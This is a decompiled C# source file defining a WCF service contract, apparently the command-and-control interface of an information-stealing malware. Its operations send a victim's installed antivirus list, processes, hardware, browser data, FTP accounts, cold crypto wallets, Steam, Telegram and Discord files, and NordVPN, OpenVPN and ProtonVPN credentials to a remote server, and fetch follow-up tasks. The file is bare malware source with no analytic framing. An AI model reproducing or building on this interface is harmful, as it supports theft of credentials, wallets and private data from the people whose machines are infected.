using System;
using System.Collections.Generic;
using System.ServiceModel;

// Token: 0x0200004B RID: 75
[ServiceContract(Name = "Endpoint", SessionMode = SessionMode.Required)]
public interface IRemoteEndpoint
{
	// Token: 0x06000177 RID: 375
	[OperationContract(Name = "CheckConnect")]
	bool CheckConnect();

	// Token: 0x06000178 RID: 376
	[OperationContract(Name = "EnvironmentSettings")]
	ScanningArgs GetArguments();

	// Token: 0x06000179 RID: 377
	[OperationContract(Name = "SetEnvironment")]
	void VerifyScanRequest(ScanResult user);

	// Token: 0x0600017A RID: 378
	[OperationContract(Name = "Init")]
	ApiResponse Init(ScanResult user);

	// Token: 0x0600017B RID: 379
	[OperationContract(Name = "InitDisplay")]
	ApiResponse InitDisplay(byte[] display);

	// Token: 0x0600017C RID: 380
	[OperationContract(Name = "PartDefenders")]
	ApiResponse PartDefenders(List<string> defenders);

	// Token: 0x0600017D RID: 381
	[OperationContract(Name = "PartLanguages")]
	ApiResponse PartLanguages(List<string> languages);

	// Token: 0x0600017E RID: 382
	[OperationContract(Name = "PartInstalledSoftwares")]
	ApiResponse PartInstalledSoftwares(List<string> softwares);

	// Token: 0x0600017F RID: 383
	[OperationContract(Name = "PartProcesses")]
	ApiResponse PartProcesses(List<string> processes);

	// Token: 0x06000180 RID: 384
	[OperationContract(Name = "PartHardwares")]
	ApiResponse PartHardwares(List<SystemHardware> hardwares);

	// Token: 0x06000181 RID: 385
	[OperationContract(Name = "PartBrowsers")]
	ApiResponse PartBrowsers(List<Browser> browsers);

	// Token: 0x06000182 RID: 386
	[OperationContract(Name = "PartFtpConnections")]
	ApiResponse PartFtpConnections(List<Account> ftps);

	// Token: 0x06000183 RID: 387
	[OperationContract(Name = "PartInstalledBrowsers")]
	ApiResponse PartInstalledBrowsers(List<BrowserVersion> installedBrowsers);

	// Token: 0x06000184 RID: 388
	[OperationContract(Name = "PartScannedFiles")]
	ApiResponse PartScannedFiles(List<ScannedFile> remoteFiles);

	// Token: 0x06000185 RID: 389
	[OperationContract(Name = "PartColdWallets")]
	ApiResponse PartColdWallets(List<ScannedFile> remoteFiles);

	// Token: 0x06000186 RID: 390
	[OperationContract(Name = "PartSteamFiles")]
	ApiResponse PartSteamFiles(List<ScannedFile> remoteFiles);

	// Token: 0x06000187 RID: 391
	[OperationContract(Name = "PartNordVPN")]
	ApiResponse PartNordVPN(List<Account> loginPairs);

	// Token: 0x06000188 RID: 392
	[OperationContract(Name = "PartOpenVPN")]
	ApiResponse PartOpenVPN(List<ScannedFile> remoteFiles);

	// Token: 0x06000189 RID: 393
	[OperationContract(Name = "PartProtonVPN")]
	ApiResponse PartProtonVPN(List<ScannedFile> remoteFiles);

	// Token: 0x0600018A RID: 394
	[OperationContract(Name = "PartTelegramFiles")]
	ApiResponse PartTelegramFiles(List<ScannedFile> remoteFiles);

	// Token: 0x0600018B RID: 395
	[OperationContract(Name = "PartDiscord")]
	ApiResponse PartDiscord(List<ScannedFile> remoteFiles);

	// Token: 0x0600018C RID: 396
	[OperationContract(Name = "Confirm")]
	void Confirm();

	// Token: 0x0600018D RID: 397
	[OperationContract(Name = "GetUpdates")]
	IList<UpdateTask> GetUpdates(ScanResult user);

	// Token: 0x0600018E RID: 398
	[OperationContract(Name = "VerifyUpdate")]
	void VerifyUpdate(ScanResult user, int updateId);
}
